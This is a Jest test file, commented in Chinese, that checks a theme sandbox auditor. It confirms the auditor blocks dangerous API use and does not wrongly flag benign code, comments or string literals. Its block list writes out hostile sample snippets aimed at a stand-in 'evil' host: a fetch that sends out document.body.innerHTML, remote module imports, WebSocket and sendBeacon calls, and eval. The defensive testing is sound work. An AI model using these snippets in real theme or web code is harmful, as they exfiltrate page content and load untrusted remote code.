/**
 * @jest-environment jsdom
 *
 * 主题沙箱审计守护：锁定 _auditThemeCode 对危险 API 的拦截，
 * 防止自定义主题成为逃逸 iframe 沙箱的攻击面。
 */
const { loadModule } = require('./__helpers__/testUtils');
const ThemeEffects = loadModule('modules/theme-effects.js', ['ThemeEffects']).ThemeEffects;

describe('主题沙箱危险 API 审计', () => {
  const DANGEROUS = [
    ['window.parent', 'window.parent.postMessage("x")'],
    ['window.top', 'window.top.location = "https://evil"'],
    ['window.opener', 'window.opener.focus()'],
    ['fetch()', 'fetch("https://evil/steal?c=" + document.body.innerHTML)'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['WebSocket', 'new WebSocket("wss://evil")'],
    ['document.cookie', 'document.cookie = "x=1"'],
    ['eval()', 'eval("alert(1)")'],
    ['new Function()', 'new Function("return 1")()'],
    ['import()', 'import("https://evil/mod.js")'],
    ['import statement', 'import x from "https://evil/mod.js"'],
    ['navigator.sendBeacon', 'navigator.sendBeacon("https://evil", "x")'],
  ];

  test.each(DANGEROUS)('拦截 %s', (_label, code) => {
    expect(ThemeEffects._auditThemeCode('test-theme', code)).toBe(true);
  });

  test('合法主题代码通过审计', () => {
    const safe =
      'const g = document.getElementById("themeEffectSection");' +
      'if (g) { g.style.color = "hsl(120 60% 50%)"; }';
    expect(ThemeEffects._auditThemeCode('test-theme', safe)).toBe(false);
  });

  test('存储三件套经内存垫片支持，不再被拦截', () => {
    // 设计变更：localStorage/sessionStorage/indexedDB 通过 new Function 形参注入隔离
    // 内存垫片，主题内部引用不再触达真实存储（安全意图不变），故审计放行而非误杀合规主题。
    const codes = [
      'localStorage.setItem("k", "v")',
      'sessionStorage.getItem("k")',
      'indexedDB.open("db")',
    ];
    for (const c of codes) {
      expect(ThemeEffects._auditThemeCode('test-theme', c)).toBe(false);
    }
  });

  test('注释中的危险关键词不误报（剥离注释后审计）', () => {
    const commented = '// 这里演示 window.top 的用法，但实际没调用\nconst x = 1;';
    expect(ThemeEffects._auditThemeCode('test-theme', commented)).toBe(false);
  });

  test('字符串字面量中的危险关键词不误报', () => {
    const inString = 'const tip = "请勿使用 window.top，否则会被拒绝";';
    expect(ThemeEffects._auditThemeCode('test-theme', inString)).toBe(false);
  });
});
